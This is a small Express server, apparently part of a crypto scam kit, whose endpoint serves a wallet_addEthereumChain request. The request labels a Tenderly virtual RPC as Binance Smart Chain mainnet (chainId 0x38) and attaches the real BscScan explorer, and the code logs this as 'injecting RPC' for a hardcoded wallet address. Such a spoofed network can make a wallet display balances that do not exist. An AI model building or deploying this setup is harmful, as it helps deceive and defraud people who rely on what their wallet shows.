const express = require("express");
const cors = require("cors");

const app = express();
app.use(cors());
app.use(express.json());

const userWallet = "0xf0FA447472ba8Feb4fBb7252B4EDEEfCee31Da89"; // Tumhara wallet address

app.get("/crypto-host", async (req, res) => {
    try {
        const rpcData = {
            method: "wallet_addEthereumChain",
            params: [{
                chainId: "0x38", // Binance Smart Chain (BSC) Mainnet
                chainName: "Binance Smart Chain - Custom",
                rpcUrls: ["https://virtual.binance.rpc.tenderly.co/f900dbd3-60c2-439f-b114-7e9e2b395189"],
                nativeCurrency: {
                    name: "BNB",
                    symbol: "BNB",
                    decimals: 18
                },
                blockExplorerUrls: ["https://bscscan.com"]
            }]
        };

        console.log(`Injecting RPC for wallet: ${userWallet}`);
        res.json({ success: true, rpcData });
    } catch (error) {
        console.error("Error injecting RPC:", error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.listen(3000, () => {
    console.log("Server running on port 3000");
});
